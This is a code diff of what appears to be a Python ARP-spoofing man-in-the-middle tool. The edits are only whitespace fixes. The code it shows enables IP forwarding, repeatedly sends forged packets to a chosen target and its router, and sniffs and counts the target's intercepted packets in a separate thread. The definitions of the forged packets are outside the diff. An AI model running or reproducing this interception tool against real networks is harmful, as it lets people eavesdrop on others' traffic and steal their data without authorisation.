@@ -7,7 +7,6 @@ from time import sleep
 
 system("clear")
 system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-
 path = sys.argv[4]
 TargetIP = sys.argv[2]
 RouterIP = sys.argv[3]
@@ -27,22 +26,19 @@ def display(pkt):
 	print "---------------------------------------------------------------------------------"
 	print ""
 	print "Sniffer is Running..."+" "+str(packets)+" "+"packets From the Target have been collected so far."
-	print "---------------------------------------------------------------------------------"	
-	
+	print "---------------------------------------------------------------------------------"
 	
 def sniffer():
 	pcap = sniff(iface=sys.argv[1],prn = display, filter = "host"+" "+TargetIP,)
-		
+
 def arp():
-  while True:
+	while True:
 		global x	
 		send(TargetAtk, verbose=0)
 		send(RouterAtk, verbose=0)
 		x=x+1
 		sleep(0.2)
-	
 def main():
 	Thread(target = sniffer).start()
 	Thread(target = arp).start() 
-	
 main()
